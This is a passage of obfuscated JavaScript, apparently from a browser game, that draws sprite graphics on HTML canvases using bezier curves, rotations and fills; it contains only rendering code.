			Δ.bezierCurveTo(ᐃ * 58, 147 * ᐃ, ᐃ * 44, ᐃ * 141, 29 * ᐃ, ᐃ * 131);
			Δ.bezierCurveTo(ᐃ * 26.5, 106.5 * ᐃ, ᐃ * 26.5, ᐃ * 106.5, 24 * ᐃ, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(53 * ᐃ, ᐃ * 53);
			Δ.bezierCurveTo(61 * ᐃ, 70 * ᐃ, ᐃ * 61, ᐃ * 70, ᐃ * 69, 87 * ᐃ);
			Δ.bezierCurveTo(67 * ᐃ, 106 * ᐃ, 67 * ᐃ, 106 * ᐃ, ᐃ * 65, ᐃ * 125);
			Δ.bezierCurveTo(54 * ᐃ, 130 * ᐃ, 51 * ᐃ, ᐃ * 130, 41 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 39, ᐃ * 105, ᐃ * 39, 105 * ᐃ, 37 * ᐃ, 85 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
			Δ.translate(ᐃ * -ⲆΔⲆⲆΔ, ᐃ * -ⵠΔⵠⵠᐃ);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(54 * ᐃ, ᐃ * 389.5);
			Δ.rotate(Δᐃᐃᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -ⲆⲆⵠⲆᐃᐃⲆ, ᐃ * -228.5, ᐃ * 30, ᐃ * 457, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆⲆΔᐃ], ⵠⲆΔⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 35, 579 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * 587, ᐃ * 61, ᐃ * 584, ᐃ * 71, ᐃ * 579);
			Δ.bezierCurveTo(ᐃ * 75, 597.5 * ᐃ, ᐃ * 75, ᐃ * 597.5, ᐃ * 79, ᐃ * 616);
			Δ.bezierCurveTo(66.5 * ᐃ, 628 * ᐃ, ᐃ * 66.5, 628 * ᐃ, 54 * ᐃ, 640 * ᐃ);
			Δ.bezierCurveTo(41 * ᐃ, 628.5 * ᐃ, 41 * ᐃ, 628.5 * ᐃ, ᐃ * 28, ᐃ * 617);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ΔⲆⲆⲆ], ᐃ * ⲆⵠⵠⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 30, 141 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 40, 136 * ᐃ, ᐃ * 40, ᐃ * 136, ᐃ * 50, 131 * ᐃ);
			Δ.bezierCurveTo(63 * ᐃ, 136 * ᐃ, 63 * ᐃ, ᐃ * 136, ᐃ * 76, 141 * ᐃ);
			Δ.bezierCurveTo(72.5 * ᐃ, 161.5 * ᐃ, ᐃ * 72.5, 161.5 * ᐃ, 69 * ᐃ, 182 * ᐃ);
			Δ.bezierCurveTo(61.5 * ᐃ, ᐃ * 186.5, 61.5 * ᐃ, ᐃ * 186.5, ᐃ * 54, 191 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45, ᐃ * 186.5, 45 * ᐃ, 186.5 * ᐃ, ᐃ * 36, ᐃ * 182);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[4], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 42, ᐃ * 152);
			Δ.bezierCurveTo(53 * ᐃ, ᐃ * 152, ᐃ * 53, ᐃ * 152, ᐃ * 64, ᐃ * 152);
			Δ.bezierCurveTo(ᐃ * 62, 171 * ᐃ, ᐃ * 62, 176 * ᐃ, ᐃ * 55, ᐃ * 177);
			Δ.bezierCurveTo(42 * ᐃ, 176 * ᐃ, ᐃ * 45, 174 * ᐃ, ᐃ * 42, ᐃ * 152);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(52 * ᐃ, ᐃ * 28);
			Δ.bezierCurveTo(ᐃ * 67.5, ᐃ * 55, ᐃ * 67.5, ᐃ * 55, 83 * ᐃ, ᐃ * 82);
			Δ.bezierCurveTo(ᐃ * 80, ᐃ * 106.5, 80 * ᐃ, 106.5 * ᐃ, ᐃ * 77, 131 * ᐃ);
			Δ.bezierCurveTo(58 * ᐃ, ᐃ * 147, 44 * ᐃ, ᐃ * 141, 29 * ᐃ, 131 * ᐃ);
			Δ.bezierCurveTo(26.5 * ᐃ, 106.5 * ᐃ, ᐃ * 26.5, ᐃ * 106.5, 24 * ᐃ, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔⵠⲆ], Ⲇᐃ[7], ⵠⵠᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 53, ᐃ * 53);
			Δ.bezierCurveTo(ᐃ * 61, 70 * ᐃ, ᐃ * 61, 70 * ᐃ, ᐃ * 69, ᐃ * 87);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 106, 67 * ᐃ, ᐃ * 106, ᐃ * 65, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54, 130 * ᐃ, 51 * ᐃ, 130 * ᐃ, 41 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(39 * ᐃ, ᐃ * 105, ᐃ * 39, 105 * ᐃ, 37 * ᐃ, 85 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			return Ⲇⵠ
		}
		const ᐃⵠᐃΔⵠⵠΔⲆᐃ = ⵠΔᐃⲆᐃΔⵠ;

		function ᐃΔᐃⲆⲆΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 170;
			var ⵠⵠᐃ = ᐃ * 172;
			var Δⵠ = ᐃⵠⵠ / 2;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(Δⵠ, ⲆⵠⲆ + ᐃ * 7);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 0;
			ⵠᐃᐃ(Δ, 0, Δᐃᐃᐃ, ᐃ * 60);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔΔᐃⵠ;
			Δ.translate(0, -ΔΔᐃⲆⲆ * ᐃ);
			Δ.save();
			for (var ⵠᐃ = 0; ⵠᐃ < 10; ⵠᐃ++) {
				Δ.rotate(Math.PI / 5);
				Δ.save();
				Δ.translate(ᐃ * 65, 0);
				ⵠΔⵠᐃ(Δ, ᐃᐃⲆΔⵠ, ᐃ * ᐃΔⲆⵠᐃ, ᐃ * 4);
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆⵠᐃ], ᐃ * 4);
				Δ.restore()
			}
			Δ.restore();
			ⵠᐃᐃ(Δ, Δᐃᐃⵠ, 0, 60 * ᐃ, Δⵠᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ], Ⲇᐃ[ΔⲆᐃⵠᐃ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, 0, Δᐃᐃⵠ, 40 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, ⵠⲆⲆ, 0, 25 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ⲆⲆⲆᐃΔ], ᐃ * ⲆⲆᐃⵠΔ);
			return Ⲇⵠ
		}

		function ⵠⲆΔᐃΔⲆⵠΔᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 170 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 172;
			var Δⵠ = ᐃⵠⵠ / Ⲇⵠⵠᐃ;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.save();
			for (var ⵠᐃ = 0; 10 > ⵠᐃ; ⵠᐃ++) {
				Δ.rotate(Math.PI / ᐃΔΔΔ);
				Δ.save();
				Δ.translate(ᐃ * 65, 0);
				ⵠΔⵠᐃ(Δ, 3, ᐃⲆⲆⵠⵠΔΔ * ᐃ, 4 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
				Δ.restore()
			}
			Δ.restore();
			ⵠᐃᐃ(Δ, 0, 0, ᐃ * 40, ᐃⵠΔ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃⵠΔ], ᐃ * ΔⵠⵠⲆΔ);
			ⵠᐃᐃ(Δ, ΔΔⵠ, ΔΔⵠⵠ, ᐃ * 20, ΔΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ⲆᐃⲆⵠⲆⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 170 * ᐃ;
			Ⲇⵠ.height = 170 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ΔᐃΔΔ, ᐃ * 5);
			Δ.save();
			Δ.translate(85 * ᐃ, 88 * ᐃ);
			Δ.rotate(1.4);
			ⵠΔⵠᐃ(Δ, ⵠⵠⲆⲆⵠ, ᐃ * 60, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * 85, ᐃ * 80);
			for (var ⵠᐃ = Ⲇᐃⵠⵠ; 10 > ⵠᐃ; ⵠᐃ++) {
				Δ.rotate(Math.PI / 5);
				Δ.save();
				Δ.translate(ᐃ * 65, 0);
				ⵠΔⵠᐃ(Δ, 3, ᐃ * 21, ᐃ * ᐃⲆᐃⲆⵠ);
				ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ], Ⲇᐃ[ⲆΔΔⵠ], ᐃ * ⲆᐃᐃΔ);
				Δ.restore()
			}
			Δ.save();
			Δ.translate(Δⵠᐃ * ᐃ, ᐃ * 0);
			Δ.rotate(1.4);
			ⵠΔⵠᐃ(Δ, ᐃⲆΔΔΔᐃᐃ, ᐃ * 60, ᐃ * 10);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ⵠⵠΔᐃΔ * ᐃ);
			Δ.rotate(.64);
			ⵠΔⵠᐃ(Δ, ⵠⵠⲆⲆⵠ, ᐃ * 40, ᐃ * 10);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⲆᐃ], Ⲇᐃ[6], ᐃ * 4);
			Δ.rotate(.12);
			ⵠΔⵠᐃ(Δ, 7, 23 * ᐃ, ᐃ * ᐃΔΔⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠᐃᐃ]);
			return Ⲇⵠ
		}

		function ᐃᐃⵠⲆᐃᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 170;
			Ⲇⵠ.height = ᐃ * 170;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ⵠΔⲆⵠ, ⵠⲆΔⵠΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 85, ᐃ * 95);
			Δ.rotate(1.4);
			ⵠΔⵠᐃ(Δ, ᐃⲆΔΔΔᐃᐃ, 60 * ᐃ, ⲆⵠⲆⵠⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * 85, 82 * ᐃ);
			for (var ⵠᐃ = ⵠⲆᐃⵠ; 10 > ⵠᐃ; ⵠᐃ++) {
				Δ.rotate(Math.PI / ⵠⲆᐃᐃ);
				Δ.save();
				Δ.translate(65 * ᐃ, ᐃⵠⲆ);
				ⵠΔⵠᐃ(Δ, ΔΔᐃΔ, ᐃ * 21, ᐃ * 4);
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ⵠΔΔᐃΔ * ᐃ);
				Δ.restore()
			}
			Δ.save();
			Δ.translate(ᐃ * ΔᐃΔΔ, ᐃ * 0);
			Δ.rotate(1);
			ⵠΔⵠᐃ(Δ, 8, 60 * ᐃ, ᐃΔⲆᐃⵠ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇᐃⵠᐃ], 4 * ᐃ);
			Δ.rotate(.56);
			ⵠΔⵠᐃ(Δ, ⵠⵠᐃΔⲆ, 40 * ᐃ, ᐃ * ΔᐃⲆⵠⵠΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔ], Ⲇᐃ[ΔᐃⲆᐃ], ᐃ * 4);
			Δ.rotate(.28);
			ⵠΔⵠᐃ(Δ, ΔᐃᐃⲆᐃ, 28 * ᐃ, ᐃ * ᐃⵠⵠⵠⲆ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠΔⵠΔⵠ]);
			Δ.restore();
			return Ⲇⵠ
		}
		const ⵠᐃⲆᐃ = Δᐃᐃⵠ;

		function ⲆΔΔⵠⵠⵠᐃᐃⵠ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 321 * ᐃ;
			Ⲇⵠ.height = ᐃ * 345;
			Δ.translate(ⲆΔⵠ, 5 * ᐃ);
			Δ.translate(0, ᐃ * ΔᐃⲆⵠᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 160.5, ᐃ * 159.5, ᐃ * 156.39595138242822);
			ΔⲆ(Δ, ⵠ[8], ⵠ[ⲆᐃΔⲆⵠ], ᐃ * ⲆⲆⲆΔ);
			Δ.translate(ⵠⲆⲆ, ᐃ * -ΔⲆᐃᐃᐃⲆⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 160.5, 159.5 * ᐃ, ᐃ * 156.39595138242822);
			ΔⲆ(Δ, ⵠ[79], ⵠ[379], ΔᐃⲆⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 31.999969482421875, ᐃ * 163.07290649414062);
			Δ.bezierCurveTo(22.999969482421875 * ᐃ, ᐃ * 67.07290649414062, 106 * ᐃ, 20.072906494140625 * ᐃ, 162 * ᐃ, ᐃ * 23.072906494140625);
			Δ.bezierCurveTo(ᐃ * 269.9999694824219, 31.072906494140625 * ᐃ, 292.9999694824219 * ᐃ, 120.07290649414062 * ᐃ, ᐃ * 294.9999694824219, 161.07290649414062 * ᐃ);
			Δ.bezierCurveTo(165.49996948242188 * ᐃ, ᐃ * 162.07290649414062, ᐃ * 165.49996948242188, 162.07290649414062 * ᐃ, ᐃ * 35.999969482421875, ᐃ * 163.07290649414062);
			Δ.closePath();
			ΔⲆ(Δ, ⵠ[329]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(32.999969482421875 * ᐃ, 165.07290649414062 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 16.999969482421875, 221.07290649414062 * ᐃ, 85 * ᐃ, 289.0729064941406 * ᐃ, ᐃ * 156, ᐃ * 294.0729064941406);
			Δ.bezierCurveTo(ᐃ * 263.9999694824219, 293.0729064941406 * ᐃ, 295.9999694824219 * ᐃ, 199.07290649414062 * ᐃ, ᐃ * 294.9999694824219, ᐃ * 159.07290649414062);
			Δ.closePath();
			ΔⲆ(Δ, "#071A1B");
			ⵠᐃᐃ(Δ, ᐃ * 161, ᐃ * 158.07290649414062, 133.4053971921676 * ᐃ);
			ΔⲆ(Δ, undefined, ⵠ[379], ᐃ * ⲆⲆⲆΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(31.999969482421875 * ᐃ, 161.62844848632812 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 162.49996948242188, ᐃ * 161.62844848632812, ᐃ * 162.49996948242188, ᐃ * 161.62844848632812, 292.9999694824219 * ᐃ, 161.62844848632812 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, ⵠ[379], 12 * ᐃ);
			Δ.translate(ΔΔⵠⵠ, ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 66, ᐃ * 158.29513549804688);
			Δ.bezierCurveTo(86 * ᐃ, ᐃ * 158.29513549804688, ᐃ * 86, ᐃ * 158.29513549804688, 106 * ᐃ, ᐃ * 158.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, ⵠ[254], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(57.999969482421875 * ᐃ, ᐃ * 117.29513549804688);
			Δ.bezierCurveTo(85 * ᐃ, ᐃ * 128.29513549804688, 85 * ᐃ, ᐃ * 128.29513549804688, 113 * ᐃ, 139.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆᐃΔⲆᐃ, ⵠ[254], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 95, ᐃ * 90.29513549804688);
			Δ.bezierCurveTo(ᐃ * 112, 105.79513549804688 * ᐃ, 112 * ᐃ, ᐃ * 105.79513549804688, ᐃ * 129, ᐃ * 121.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[254], ᐃ * ᐃᐃΔᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(116 * ᐃ, 52.850677490234375 * ᐃ);
			Δ.bezierCurveTo(130 * ᐃ, 83.85067749023438 * ᐃ, ᐃ * 130, 83.85067749023438 * ᐃ, 144 * ᐃ, ᐃ * 114.85067749023438);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, ⵠ[254], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 159, ᐃ * 61.295135498046875);
			Δ.bezierCurveTo(160.49996948242188 * ᐃ, 92.29513549804688 * ᐃ, 160.49996948242188 * ᐃ, 92.29513549804688 * ᐃ, 160 * ᐃ, ᐃ * 123.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔⵠᐃΔ, ⵠ[254], ⵠⲆᐃᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(203 * ᐃ, 51.295135498046875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 190.49996948242188, 83.29513549804688 * ᐃ, ᐃ * 190.49996948242188, 83.29513549804688 * ᐃ, 176 * ᐃ, ᐃ * 115.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[254], ΔᐃⵠⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(225 * ᐃ, ᐃ * 89.29513549804688);
			Δ.bezierCurveTo(ᐃ * 210.49996948242188, ᐃ * 104.79513549804688, ᐃ * 210.49996948242188, 104.79513549804688 * ᐃ, ᐃ * 194, 120.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[254], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(266.9999694824219 * ᐃ, 112.29513549804688 * ᐃ);
			Δ.bezierCurveTo(233.49996948242188 * ᐃ, 127.29513549804688 * ᐃ, 233.49996948242188 * ᐃ, 127.29513549804688 * ᐃ, ᐃ * 199, ᐃ * 142.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[254], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 256.9999694824219, 155.29513549804688 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 238.49996948242188, 156.29513549804688 * ᐃ, 238.49996948242188 * ᐃ, 156.29513549804688 * ᐃ, 219 * ᐃ, ᐃ * 157.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠⵠΔ, ⵠ[254], ⵠⲆᐃᐃⲆ * ᐃ);
			Δ.translate(0, -ΔᐃᐃⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(66 * ᐃ, 158.29513549804688 * ᐃ);
			Δ.bezierCurveTo(86 * ᐃ, 158.29513549804688 * ᐃ, ᐃ * 86, ᐃ * 158.29513549804688, 106 * ᐃ, 158.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[576], ᐃ * ⲆΔⲆⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(57.999969482421875 * ᐃ, 117.29513549804688 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 85, ᐃ * 128.29513549804688, 85 * ᐃ, 128.29513549804688 * ᐃ, ᐃ * 113, 139.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[576], ᐃ * ᐃᐃΔᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(95 * ᐃ, 90.29513549804688 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112, 105.79513549804688 * ᐃ, ᐃ * 112, ᐃ * 105.79513549804688, ᐃ * 129, 121.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, ⵠ[576], ᐃ * ᐃᐃΔᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(116 * ᐃ, 52.850677490234375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 130, ᐃ * 83.85067749023438, ᐃ * 130, ᐃ * 83.85067749023438, 144 * ᐃ, 114.85067749023438 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠΔⵠΔ, ⵠ[576], ᐃ * ᐃⲆⵠᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(159 * ᐃ, 61.295135498046875 * ᐃ);
			Δ.bezierCurveTo(160.49996948242188 * ᐃ, ᐃ * 92.29513549804688, 160.49996948242188 * ᐃ, ᐃ * 92.29513549804688, ᐃ * 160, ᐃ * 123.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔⵠᐃΔ, ⵠ[576], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(203 * ᐃ, 51.295135498046875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 190.49996948242188, ᐃ * 83.29513549804688, ᐃ * 190.49996948242188, 83.29513549804688 * ᐃ, 176 * ᐃ, 115.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[576], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(225 * ᐃ, ᐃ * 89.29513549804688);
			Δ.bezierCurveTo(210.49996948242188 * ᐃ, ᐃ * 104.79513549804688, ᐃ * 210.49996948242188, ᐃ * 104.79513549804688, 194 * ᐃ, 120.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠᐃⵠⲆΔ, ⵠ[576], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 266.9999694824219, ᐃ * 112.29513549804688);
			Δ.bezierCurveTo(ᐃ * 233.49996948242188, ᐃ * 127.29513549804688, 233.49996948242188 * ᐃ, ᐃ * 127.29513549804688, ᐃ * 199, ᐃ * 142.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔⵠᐃΔ, ⵠ[576], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 256.9999694824219, ᐃ * 155.29513549804688);
			Δ.bezierCurveTo(238.49996948242188 * ᐃ, 156.29513549804688 * ᐃ, 238.49996948242188 * ᐃ, ᐃ * 156.29513549804688, 219 * ᐃ, 157.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[576], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(96 * ᐃ, 166 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 88, 117 * ᐃ, 129 * ᐃ, 92 * ᐃ, 161 * ᐃ, 91 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201, 90 * ᐃ, 223 * ᐃ, ᐃ * 121, 230 * ᐃ, 161 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, "#704618", "#5D3D1A", 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 94.00003051757812, 164.40341186523438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 162.50003051757812, 164.40341186523438 * ᐃ, 230.00003051757812 * ᐃ, 165.40341186523438 * ᐃ, 231.00003051757812 * ᐃ, ᐃ * 164.40341186523438);
			Δ.bezierCurveTo(ᐃ * 214.00003051757812, 267.4034118652344 * ᐃ, ᐃ * 92.00003051757812, ᐃ * 243.40341186523438, ᐃ * 93.00003051757812, 165.40341186523438 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, "#E1DDD5", "#EAE7E4", 8 * ᐃ);
			ⵠᐃᐃ(Δ, 160.00003051757812 * ᐃ, 166.49432373046875 * ᐃ, ᐃ * 28.30194339616981);
			ΔⲆ(Δ, ⵠ[79], ⵠ[379], ᐃ * 10);
			return Ⲇⵠ
		}

		function ΔⲆᐃᐃⵠⲆⵠᐃΔ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 321;
			Ⲇⵠ.height = 345 * ᐃ;
			Δ.translate(0, 5 * ᐃ);
			ⵠᐃᐃ(Δ, 161.00003051757812 * ᐃ, ᐃ * 165.40341186523438, 20.808652046684813 * ᐃ);
			ΔⲆ(Δ, ⵠ[240], ⵠ[531], ᐃⵠΔⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 162.00003051757812, ᐃ * 48.403411865234375);
			Δ.bezierCurveTo(ᐃ * 172.50003051757812, 67.40341186523438 * ᐃ, 172.50003051757812 * ᐃ, 67.40341186523438 * ᐃ, 183.00003051757812 * ᐃ, 86.40341186523438 * ᐃ);
